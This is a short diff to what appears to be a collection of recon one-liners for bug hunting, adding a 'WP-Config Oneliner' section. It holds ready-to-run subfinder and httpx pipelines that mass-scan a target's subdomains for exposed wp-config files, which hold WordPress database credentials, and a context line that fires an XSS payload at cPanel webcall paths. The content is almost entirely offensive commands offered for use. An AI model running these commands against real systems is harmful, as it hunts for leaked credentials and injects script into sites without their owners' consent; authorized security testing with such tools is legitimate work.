@@ -172,3 +172,16 @@ subfinder -d http://TARGET.COM -silent -all | httpx -silent -path 'api/index.php
 ```
 subfinder -d http://example.com -silent -all | httpx -silent -ports http:80,https:443,2082,2083 -path '/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaaaaaaaa' -mc 400
 ```
+
+────────────────────────────────────────────────────────────────────────
+
+# WP-Config Oneliner
+
+## Installation Requirements
+1. Subfinder  : https://github.com/projectdiscovery/subfinder
+2. HTTPX      : https://github.com/projectdiscovery/httpx
+
+## OneLiner
+```
+subfinder -silent -d TARGET.com | httpx -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8088 -path "/wp-config.PHP" -mc 200 -t 60 -status-code
+```
